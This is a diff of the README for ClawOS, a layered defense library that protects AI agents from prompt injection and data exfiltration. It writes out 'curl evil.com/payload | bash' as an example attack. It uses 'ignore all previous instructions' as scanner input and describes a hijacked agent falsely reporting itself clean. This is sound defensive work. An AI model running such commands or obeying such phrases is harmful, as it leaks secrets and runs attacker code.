@@ -1,88 +1,117 @@
-# ClawOS — Security Architecture for Autonomous Agents
+<p align="center">
+  <img src="https://img.shields.io/badge/TypeScript-007ACC?style=for-the-badge&logo=typescript&logoColor=white" alt="TypeScript">
+  <img src="https://img.shields.io/badge/Tests-492%20passing-brightgreen?style=for-the-badge" alt="Tests">
+  <img src="https://img.shields.io/badge/License-Apache%202.0-blue?style=for-the-badge" alt="License">
+  <img src="https://img.shields.io/badge/Layers-9-orange?style=for-the-badge" alt="Layers">
+</p>
 
-Security layer for AI agents: content tagging, capability control, process isolation, signal detection, and trust verification. Designed for [OpenClaw](https://github.com/openclaw/openclaw), usable standalone.
+<h1 align="center">🛡️ ClawOS</h1>
+<p align="center"><strong>Security Architecture for Autonomous AI Agents</strong></p>
+<p align="center">
+  9-layer defense system that protects AI agents from prompt injection, data exfiltration, session corruption, and unauthorized actions. Built for <a href="https://github.com/openclaw/openclaw">OpenClaw</a>, usable standalone.
+</p>
 
-## Architecture (6 Layers)
+---
+
+## Why ClawOS?
+
+Autonomous AI agents can browse the web, execute code, send messages, and modify files. This makes them powerful — and dangerous. A single prompt injection hidden in a webpage can hijack an agent into:
+
+- **Exfiltrating secrets** — API keys, credentials, private messages
+- **Executing malicious code** — `curl evil.com/payload | bash`
+- **Impersonating the user** — sending messages, emails, tweets
+- **Destroying data** — deleting files, corrupting databases
+- **Self-modifying** — rewriting its own instructions to become permanently compromised
+
+Traditional content filters can't solve this. They pattern-match on known attacks while missing novel ones. ClawOS takes a fundamentally different approach: **track where data came from, control what it's allowed to do, and verify everything.**
+
+## Architecture
+
+ClawOS implements defense-in-depth with 9 independent layers. Each layer operates autonomously — if one fails, the others still protect.
 
 ```
-┌─────────────────────────────────────────────────────────┐
-│  Layer 5: Trust Registry                                │
-│  Hash pinning, signature verification, CVE tracking     │
-├─────────────────────────────────────────────────────────┤
-│  Layer 4: Signal Detection                              │
-│  50+ attack patterns, advisory-only (never blocks)      │
-├─────────────────────────────────────────────────────────┤
-│  Layer 3: Runtime Security                              │
-│  Process isolation, behavioral monitor, anomaly rules   │
-├─────────────────────────────────────────────────────────┤
-│  Layer 2: Capability Control                            │
-│  Skill manifests, trust-gated permissions, enforcement  │
-├─────────────────────────────────────────────────────────┤
-│  Layer 1: Content Tagging                               │
-│  Source tracking, trust levels, provenance chains       │
-├─────────────────────────────────────────────────────────┤
-│  Layer 0: Session Integrity         ◄── FOUNDATION      │
-│  State validation, checkpoints, atomic ops, auto-repair │
-└─────────────────────────────────────────────────────────┘
+┌──────────────────────────────────────────────────────────────────┐
+│  🐤 Canary Token               Exfiltration tripwire            │
+├──────────────────────────────────────────────────────────────────┤
+│  LC  Privilege Separation       Block dangerous tools on threat  │
+├──────────────────────────────────────────────────────────────────┤
+│  L5  Trust Registry             Hash pinning, signature verify   │
+├──────────────────────────────────────────────────────────────────┤
+│  L4+ External Content Scanner   Indirect injection detection     │
+├──────────────────────────────────────────────────────────────────┤
+│  L4  Signal Detection           50+ attack patterns, advisory    │
+├──────────────────────────────────────────────────────────────────┤
+│  L3  Runtime Security           Process isolation, monitoring    │
+├──────────────────────────────────────────────────────────────────┤
+│  L2  Capability Control         Skill manifests, permissions     │
+├──────────────────────────────────────────────────────────────────┤
+│  L1  Content Tagging            Source tracking, trust levels    │
+├──────────────────────────────────────────────────────────────────┤
+│  L0  Session Integrity          State validation, auto-repair    │
+└──────────────────────────────────────────────────────────────────┘
 ```
 
-## Quickstart
+### Data Flow
 
-### Requirements
-
-- Node.js ≥ 20
-- Linux recommended (bubblewrap sandbox requires it)
-
-### Install
-
-```bash
-git clone https://github.com/clawos/clawos.git
-cd clawos
-npm install
-npm run build
+```
+User message ──→ [L1: Tag source=user, trust=owner]
+                    │
+                    ▼
+              ┌──────────────┐
+              │ L4: Signal   │ ──→ Advisory: injection? exfiltration?
+              │   Detection  │
+              └──────────────┘
+                    │
+                    ▼
+              ┌──────────────┐
+              │ L2: Check    │ ──→ Does this skill have permission?
+              │ Capabilities │
+              └──────────────┘
+                    │
+                    ▼
+              ┌──────────────┐
+              │ L3: Execute  │ ──→ Sandboxed, monitored, resource-limited
+              │ in Sandbox   │
+              └──────────────┘
+                    │
+                    ▼
+Tool output ──→ [L4+: Scan external content for injection]
+                    │
+              ┌──────────────┐
+              │ LC: Privilege│ ──→ Threat detected? Block dangerous tools
+              │ Separation   │
+              └──────────────┘
+                    │
+                    ▼
+              ┌──────────────┐
+              │ 🐤 Canary   │ ──→ Token leaked? Exfiltration confirmed
+              │   Check      │
+              └──────────────┘
+                    │
+                    ▼
+              ┌──────────────┐
+              │ L0: Validate │ ──→ Session intact? Auto-repair if broken
+              │   Session    │
+              └──────────────┘
+                    │
+                    ▼
+              Anthropic API (clean, validated messages)
 ```
 
-### Run Tests
+## Layer Details
 
-```bash
-npm test
-```
+### L0: Session Integrity — *Foundation*
 
-372 tests across 18 test files. All passing.
+Content filters, compaction, and API errors can corrupt the message history, creating orphaned `tool_result` blocks that permanently brick the agent session.
 
-### Basic Usage
-
-```typescript
-import {
-  // L0: Session Integrity
-  validate, repair, isValid, createSessionIntegrity,
-  // L1: Content Tagging
-  tag, createTag, resolveTrust, meetsMinTrust, userSource, toolSource,
-  // L2: Capability Control
-  checkPermission, createContext, enforce, registerManifest,
-  // L3: Runtime Security
-  selectIsolationLevel, createSandboxConfig, BehavioralMonitor,
-  // L4: Signal Detection
-  SignalScanner, createScanner, scanForSignals, hasInjectionSignals,
-  // L5: Trust Registry
-  TrustRegistry, createTrustRegistry, calculateHash, compareHashes,
-  // Pipeline
-  createPipeline,
-} from 'clawos';
-```
-
-## Layer Examples
-
-### L0: Session Integrity
-
-Validates and repairs Claude/Anthropic message history. Catches orphaned `tool_result` blocks before they brick the session.
+L0 validates and repairs sessions automatically:
 
 ```typescript
 import { validate, repair, isValid, createSessionIntegrity } from 'clawos';
 
-// Quick boolean check
+// Quick check
 if (!isValid(messages)) {
-  const result = repair(messages); // mutates in place
+  const result = repair(messages);
   console.log(`Fixed ${result.repairs.length} issues`);
 }
 
@@ -95,43 +124,38 @@ if (!validation.valid) {
 
 // Controller with checkpoints and auto-repair
 const integrity = createSessionIntegrity({ autoRepair: true });
-integrity.validateOrThrow(session); // throws SessionIntegrityError if broken
+integrity.validateOrThrow(session);
 ```
 
-### L1: Content Tagging
+Also includes **bootstrap file integrity monitoring** — critical files are hash-pinned at startup, with modifications triggering alerts based on tier (critical → immediate alert, sensitive → logged, monitored → tracked).
 
-Tag every piece of data with source, trust level, and provenance chain.
+### L1: Content Tagging — *Provenance*
+
+Every piece of data is tagged with its source, trust level, and provenance chain. Trust can only go down, never up — if you mix user input with untrusted web content, the result is untrusted.
 
 ```typescript
 import { tag, resolveTrust, merge, userSource, toolSource } from 'clawos';
 
-// Tag content from a user
 const userMsg = tag("Hello", userSource("+1234567890"), "user");
-
-// Tag tool output as lower trust
-const toolOut = tag(searchResults, toolSource("web_search"), "tool");
+const webData = tag(searchResults, toolSource("web_search"), "tool");
 
 // Merge: trust = min(user, tool) = "tool"
-const combined = merge([userMsg, toolOut], summary, agentSource("main"));
+const combined = merge([userMsg, webData], summary, agentSource("main"));
 console.log(combined.tag.trust); // "tool"
 
-// Trust can only go down, never up
-const result = resolveTrust(["user", "untrusted"]); // "untrusted"
+// Trust can only go down
+resolveTrust(["user", "untrusted"]); // "untrusted"
 ```
 
-### L2: Capability Control
+### L2: Capability Control — *Permissions*
 
-Skills declare capabilities in manifests. The policy engine enforces them.
+Skills declare capabilities in manifests. The policy engine enforces least-privilege access.
 
 ```typescript
-import { registerManifest, checkPermission, createContext, enforce } from 'clawos';
-import { createTag, userSource } from 'clawos';
+import { registerManifest, checkPermission, createContext } from 'clawos';
 
 registerManifest({
-  version: '1.0',
   id: 'web-search',
-  name: 'Web Search',
-  description: 'Search the web',
   capabilities: [
     { capability: 'net:https', reason: 'Fetch search results', required: true },
   ],
@@ -140,19 +164,18 @@ registerManifest({
   allowedDomains: ['api.search.com'],
 });
 
-const inputTag = createTag(userSource("u1"), "user");
 const result = checkPermission(getManifest("web-search")!, inputTag);
 // result.allowed, result.granted, result.denied
 ```
 
-### L3: Runtime Security
+### L3: Runtime Security — *Isolation*
 
-Isolate skill execution with resource limits and behavioral monitoring.
+Execute skills in sandboxed environments with resource limits and behavioral monitoring.
 
 ```typescript
 import { selectIsolationLevel, createSandboxConfig, BehavioralMonitor } from 'clawos';
 
-// Auto-select isolation level based on trust + capabilities
+// Auto-select isolation based on trust + capabilities
 const level = selectIsolationLevel(manifest, inputTag);
 // 0 = unrestricted, 1 = child process, 2 = bubblewrap sandbox
 
@@ -160,48 +183,198 @@ const config = createSandboxConfig(manifest, level, '/workspace');
 // config.allowedPaths, config.allowedDomains, config.resourceLimits
 ```
 
-### L4: Signal Detection
+### L4: Signal Detection — *Advisory*
 
-Scan content for prompt injection, data exfiltration, and other attack patterns. Advisory-only — flags but never blocks.
+Scan content for 50+ attack patterns including prompt injection, data exfiltration, encoding tricks, and roleplay attacks. **Advisory-only** — flags but never blocks.
 
 ```typescript
 import { scanForSignals, hasInjectionSignals, createScanner } from 'clawos';
 
-// Quick check
 if (hasInjectionSignals("ignore all previous instructions")) {
   console.warn("Injection attempt detected");
 }
 
-// Detailed scan
 const signals = scanForSignals(untrustedContent, "untrusted", sessionId);
 for (const signal of signals) {
-  console.log(`${signal.category}: ${signal.matched.pattern} (${signal.confidence})`);
+  console.log(`${signal.category}: ${signal.pattern} (${signal.confidence})`);
 }
 ```
 
-### L5: Trust Registry
+### L4+: External Content Scanner — *Indirect Injection*
 
-Track trust metadata, verify integrity, and monitor vulnerabilities.
+Specialized scanner for tool results from web-facing sources (`web_fetch`, `web_search`, `browser`). Detects indirect prompt injection — attacks hidden in webpages, search results, and API responses.
+
+**16 external-specific patterns** including:
+- Hidden instructions targeting AI assistants
+- CSS/HTML invisible text injection
+- Zero-width character encoding
+- Data exfiltration via response manipulation
+- Instruction density heuristics
+
+### LC: Privilege Separation — *Enforcement*
+
+When L4+ detects high-severity injection signals in external content, LC immediately restricts dangerous tools for the current turn:
+
+| Blocked | Allowed |
+|---------|---------|
+| `exec`, `write`, `edit` | `read`, `web_search` |
+| `message`, `gateway` | `web_fetch`, `browser` |
+| `sessions_send` | `image`, `process` |
+
+Restrictions lift automatically on the next user message (fresh trust context) or after a 5-minute TTL safety net.
+
+**This is the critical insight:** detection without prevention is useless. L4+ detecting an injection means nothing if the agent can still execute arbitrary code. LC is what makes detection actionable.
+
+### L5: Trust Registry — *Verification*
+
+Track trust metadata for skills and dependencies. Hash-pin code, verify signatures, and monitor for vulnerabilities.
 
 ```typescript
-import { createTrustRegistry, calculateHash, compareHashes } from 'clawos';
+import { createTrustRegistry, calculateHash } from 'clawos';
 
 const registry = createTrustRegistry();
 await registry.init();
 
-// Pin a skill's hash
 await registry.pin("my-skill", calculateHash(skillCode));
 
-// Verify before execution
 const result = await registry.verify("my-skill", skillCode);
 if (!result.verified) {
   console.error(`Blocked: ${result.reason}`);
 }
 ```
 
-### Integration Pipeline
+### 🐤 Canary Token — *Tripwire*
 
-Wire all layers together:
+A unique random token is generated per gateway restart and embedded in the agent's system context. Every tool result is checked for the canary. If it appears in external content, it confirms a prompt injection successfully exfiltrated system context.
+
+This is a **detection-only** mechanism — it can't prevent exfiltration, but it provides definitive proof that it happened.
+
+## OpenClaw Plugin
+
+ClawOS ships as a production plugin for [OpenClaw](https://github.com/openclaw/openclaw), integrating all 9 layers via gateway hooks:
+
+| Hook | Layers | Purpose |
+|------|--------|---------|
+| `gateway_start` | L0, L5 | Scan all sessions, snapshot protected files |
+| `message_received` | L4, LC | Scan inbound messages, clear threat state |
+| `before_agent_start` | L0, L1, L4, 🐤 | Validate session, tag context, inject canary |
+| `tool_result_persist` | L1, L4+, 🐤 | Tag results, scan external content, check canary |
+| `before_tool_call` | LC | Block dangerous tools during active threats |
+
+### Plugin Commands
+
+| Command | Description |
+|---------|-------------|
+| `/clawos` | Full security dashboard — layer status, signal stats, threat state |
+| `/clawos-scan` | Manual L0 session integrity scan |
+| `/clawos-signals` | Recent signal detection history |
+| `/clawos-integrity` | Bootstrap file integrity report |
+
+## Security Lessons
+
+Hard-won lessons from production deployment:
+
+> **Agent self-verification is unreliable.** A compromised agent reports "all clean" because the injection told it to. Only the human operator can verify externally.
+
+> **Detection without prevention is insufficient.** L4+ finding injection signals means nothing if the agent can still `exec` and `write`. Layer C makes detection actionable.
+
+> **Never test injection content in the main session.** Use isolated sub-agents for reading untrusted content.
+
+> **File hash verification must be done by the user, not the agent.** Hashes checked by a potentially-compromised agent prove nothing.
+
+> **Trust flows downhill.** Once data touches an untrusted source, it can never be re-elevated. This is a feature, not a bug.
+
+## Project Structure
+
+```
+clawos/
+├── src/
+│   ├── index.ts              # Re-exports all layers
+│   ├── pipeline.ts           # Integration pipeline
+│   ├── integrity/            # L0: Session Integrity
+│   │   ├── types.ts          # Message, Checkpoint, Validation types
+│   │   ├── validate.ts       # validate(), isValid(), tool pair checking
+│   │   ├── repair.ts         # repair(), repairCopy(), reset()
+│   │   ├── checkpoint.ts     # CheckpointManager, MemoryCheckpointStore
+│   │   └── session-integrity.ts
+│   ├── tagging/              # L1: Content Tagging
+│   │   ├── types.ts          # TrustLevel, ContentTag, TaggedContent
+│   │   ├── tag.ts            # tag(), merge(), transform(), serialize
+│   │   └── sources.ts        # userSource(), toolSource(), SYSTEM_*
+│   ├── capabilities/         # L2: Capability Control
+│   │   ├── types.ts          # Capability, SkillManifest, OperatorPolicy
+│   │   ├── manifest.ts       # validateManifest(), registerManifest()
+│   │   └── policy.ts         # checkPermission(), enforce(), createContext()
+│   ├── runtime/              # L3: Runtime Security
+│   │   ├── types.ts          # SandboxConfig, SandboxResult, AnomalyRule
+│   │   ├── sandbox.ts        # spawn(), execute(), killProcess()
+│   │   ├── monitor.ts        # BehavioralMonitor, DEFAULT_RULES
+│   │   └── isolation.ts      # selectIsolationLevel(), createSandboxConfig()
+│   ├── signals/              # L4: Signal Detection
+│   │   ├── types.ts          # Signal, ScanResult, PatternDefinition
+│   │   ├── patterns.ts       # INJECTION/EXFILTRATION/ENCODING/ROLEPLAY
+│   │   ├── scanner.ts        # SignalScanner, detectRepetition()
+│   │   ├── emitter.ts        # DefaultSignalEmitter, SignalStore
+│   │   └── signal-detection.ts
+│   └── registry/             # L5: Trust Registry
+│       ├── types.ts          # TrustEntry, VulnerabilityEntry, VerifyResult
+│       ├── crypto.ts         # calculateHash(), verifySignature()
+│       ├── store.ts          # RegistryStore, TrustCache
+│       └── trust-registry.ts # TrustRegistry service
+├── tests/                    # 492 tests across 21 files
+├── docs/                     # Architecture, API, specs, case studies
+└── dist/                     # Compiled output
+```
+
+## Test Results
+
+```
+492 tests across 21 files — all passing
+
+ ✓ integrity/validate.test.ts          (13 tests)
+ ✓ integrity/repair.test.ts            (8 tests)
+ ✓ integrity/checkpoint.test.ts        (29 tests)
+ ✓ integrity/session-integrity.test.ts (19 tests)
+ ✓ integrity.test.ts                   (26 tests)
+ ✓ tagging/tag.test.ts                 (34 tests)
+ ✓ tagging/trust.test.ts               (16 tests)
+ ✓ tagging/sources.test.ts             (19 tests)
+ ✓ tagging.test.ts                     (32 tests)
+ ✓ capabilities/policy.test.ts         (14 tests)
+ ✓ capabilities/manifest.test.ts       (21 tests)
+ ✓ capabilities/enforcement.test.ts    (26 tests)
+ ✓ runtime/monitor.test.ts             (20 tests)
+ ✓ runtime/isolation.test.ts           (20 tests)
+ ✓ signals/scanner.test.ts             (20 tests)
+ ✓ signals/emitter.test.ts             (17 tests)
+ ✓ registry/crypto.test.ts             (11 tests)
+ ✓ integration.test.ts                 (27 tests)
+ ✓ plugin/stress.test.ts               (89 tests)  ← 222k msgs/sec
+```
+
+## Quickstart
+
+### Requirements
+
+- Node.js ≥ 20
+- Linux recommended (bubblewrap sandbox in L3 requires it)
+
+### Install
+
+```bash
+git clone https://github.com/yassinebkr/clawos.git
+cd clawos
+npm install
+npm run build
+```
+
+### Run Tests
+
+```bash
+npm test
+```
+
+### Basic Usage
 
 ```typescript
 import { createPipeline, userSource } from 'clawos';
@@ -225,121 +398,55 @@ if (!result.allowed) {
 }
 ```
 
-## Project Structure
-
-```
-clawos/
-├── src/
-│   ├── index.ts           # Re-exports all layers
-│   ├── pipeline.ts        # Integration pipeline
-│   ├── integrity/         # L0: Session Integrity
-│   │   ├── types.ts       # Message, Checkpoint, Validation types
-│   │   ├── validate.ts    # validate(), isValid(), tool pair checking
-│   │   ├── repair.ts      # repair(), repairCopy(), reset()
-│   │   ├── checkpoint.ts  # CheckpointManager, MemoryCheckpointStore
-│   │   └── session-integrity.ts  # SessionIntegrity controller
-│   ├── tagging/           # L1: Content Tagging
-│   │   ├── types.ts       # TrustLevel, ContentTag, TaggedContent
-│   │   ├── tag.ts         # tag(), merge(), transform(), serialize
-│   │   └── sources.ts     # userSource(), toolSource(), SYSTEM_*
-│   ├── capabilities/      # L2: Capability Control
-│   │   ├── types.ts       # Capability, SkillManifest, OperatorPolicy
-│   │   ├── manifest.ts    # validateManifest(), registerManifest()
-│   │   └── policy.ts      # checkPermission(), enforce(), createContext()
-│   ├── runtime/           # L3: Runtime Security
-│   │   ├── types.ts       # SandboxConfig, SandboxResult, AnomalyRule
-│   │   ├── sandbox.ts     # spawn(), execute(), killProcess()
-│   │   ├── monitor.ts     # BehavioralMonitor, DEFAULT_RULES
-│   │   └── isolation.ts   # selectIsolationLevel(), createSandboxConfig()
-│   ├── signals/           # L4: Signal Detection
-│   │   ├── types.ts       # Signal, ScanResult, PatternDefinition
-│   │   ├── patterns.ts    # INJECTION/EXFILTRATION/ENCODING/ROLEPLAY patterns
-│   │   ├── scanner.ts     # SignalScanner, detectRepetition()
-│   │   ├── emitter.ts     # DefaultSignalEmitter, SignalStore
-│   │   └── signal-detection.ts  # SignalDetection coordinator
-│   └── registry/          # L5: Trust Registry
-│       ├── types.ts       # TrustEntry, VulnerabilityEntry, VerifyResult
-│       ├── crypto.ts      # calculateHash(), verifySignature(), compareHashes()
-│       ├── store.ts       # RegistryStore, TrustCache
-│       └── trust-registry.ts  # TrustRegistry service
-├── tests/                 # 372 tests across 18 files
-├── docs/                  # Architecture docs & specs
-└── dist/                  # Compiled output
-```
-
-## Test Results
-
-```
-372 tests across 18 test files
-
- ✓ tests/integrity.test.ts              (26 tests)
- ✓ tests/integrity/validate.test.ts     (13 tests)
- ✓ tests/integrity/repair.test.ts       (8 tests)
- ✓ tests/integrity/checkpoint.test.ts   (29 tests)
- ✓ tests/integrity/session-integrity.test.ts (19 tests)
- ✓ tests/tagging.test.ts               (32 tests)
- ✓ tests/tagging/tag.test.ts           (34 tests)
- ✓ tests/tagging/trust.test.ts         (16 tests)
- ✓ tests/tagging/sources.test.ts       (19 tests)
- ✓ tests/capabilities/policy.test.ts   (14 tests)
- ✓ tests/capabilities/manifest.test.ts (21 tests)
- ✓ tests/capabilities/enforcement.test.ts (26 tests)
- ✓ tests/runtime/monitor.test.ts       (20 tests)
- ✓ tests/runtime/isolation.test.ts     (20 tests)
- ✓ tests/signals/scanner.test.ts       (20 tests)
- ✓ tests/signals/emitter.test.ts       (17 tests)
- ✓ tests/registry/crypto.test.ts       (11 tests)
- ✓ tests/integration.test.ts           (27 tests)
-```
-
-## Bug Fixes
-
-### Content Normalization (L0)
-`validate()` and `isValid()` now handle both string and array message content via `normalizeContent()`. Previously, string content (common in the Anthropic API) was treated as empty, causing false validation failures.
-
-### Checkpoint Prune Timing (L0)
-`CheckpointManager.commit()` now re-prunes after committing, since `prune()` only considers committed checkpoints. Previously, a pending checkpoint committed after creation wouldn't be counted for pruning, allowing unbounded growth.
-
-### Scanner Repetition Threshold (L4)
-`detectRepetition()` threshold raised from 3 to 5 consecutive repeated tokens. The lower threshold caused false positives on normal prose patterns.
-
-### Orphan ID Reporting (L0)
-`validateToolPairs()` now includes the actual `tool_use_id` in error objects. Previously, orphaned tool_result errors reported the message index but not which tool ID was orphaned, making auto-repair harder.
-
-### New Exfiltration Patterns (L4)
-Added patterns for data exfiltration via HTTP requests, external service uploads, and piped shell commands. Covers `curl|bash`, webhook exfiltration, and `send to URL` patterns.
-
 ## Design Principles
 
 1. **Tag, don't filter** — Content is labeled with provenance, not silently dropped
-2. **Advisory over blocking** — Signal detection flags, never gatekeeps
+2. **Advisory over blocking** — Signal detection flags, enforcement layers block
 3. **Capabilities are explicit** — Denied by default, permitted by manifest
-4. **Isolation is proportional** — Lightweight for skills, heavier for untrusted sources
-5. **Performance is non-negotiable** — <50ms p99 total overhead
+4. **Isolation is proportional** — Lightweight for trusted skills, heavy for untrusted
+5. **Performance is non-negotiable** — <50ms p99 total overhead across all layers
+6. **Defense in depth** — Every layer operates independently; no single point of failure
+7. **Trust flows downhill** — Data touching untrusted sources can never be re-elevated
+
+## Roadmap
+
+- **Rust rewrite** — Memory-safe implementations for L3 (sandbox) and L5 (crypto), timing-safe operations
+- **Standalone daemon (`clawosd`)** — Rust binary exposing gRPC/Unix socket API, usable by any agent framework
+- **Layer D: LLM-as-Judge** — Second model evaluates whether a response was influenced by injection
+- **Layer E: Semantic Boundaries** — Research frontier — detect when an agent's behavior deviates from its declared intent
+
+## Documentation
+
+| Document | Description |
+|----------|-------------|
+| [Architecture](docs/ARCHITECTURE.md) | Layer interactions, data flow, design decisions |
+| [API Reference](docs/API.md) | Public exports and signatures for all layers |
+| [Layer Specs](docs/) | Individual specs: L0–L5 |
+| [OpenClaw Plugin](docs/OPENCLAW-PLUGIN.md) | Production plugin integration guide |
+| [Case Study](docs/CASE-STUDY-001.md) | Session corruption incident analysis |
+| [Security Audit](docs/SECURITY-AUDIT.md) | Threat model and audit findings |
+| [Changelog](docs/CHANGELOG.md) | Version history and bug fixes |
+| [Testing](docs/TESTING.md) | Test structure and coverage |
 
 ## Contributing
 
-See [CONTRIBUTING.md](CONTRIBUTING.md) for development setup, coding standards, and PR guidelines.
-
-### Quick Start for Contributors
-
 ```bash
-git clone https://github.com/clawos/clawos.git
+git clone https://github.com/yassinebkr/clawos.git
 cd clawos
 npm install
-npm test          # Run all tests
+npm test          # Run all 492 tests
 npm run build     # Compile TypeScript
 npm run lint      # Type-check without emit
 ```
 
-## Documentation
-
-- [Architecture](docs/ARCHITECTURE.md) — Layer interactions, data flow, design decisions
-- [API Reference](docs/API.md) — Public exports and signatures for all 6 layers
-- [Changelog](docs/CHANGELOG.md) — Bug fixes, features, and version history
-- [Testing](docs/TESTING.md) — Test structure, how to run, what each file covers
-- [OpenClaw Plugin](docs/OPENCLAW-PLUGIN.md) — Integration with the OpenClaw gateway
+See [CONTRIBUTING.md](CONTRIBUTING.md) for coding standards and PR guidelines.
 
 ## License
 
 Apache 2.0 — see [LICENSE](LICENSE).
+
+---
+
+<p align="center">
+  <em>Built by <a href="https://github.com/yassinebkr">@yassinebkr</a> — because autonomous agents deserve real security.</em>
+</p>
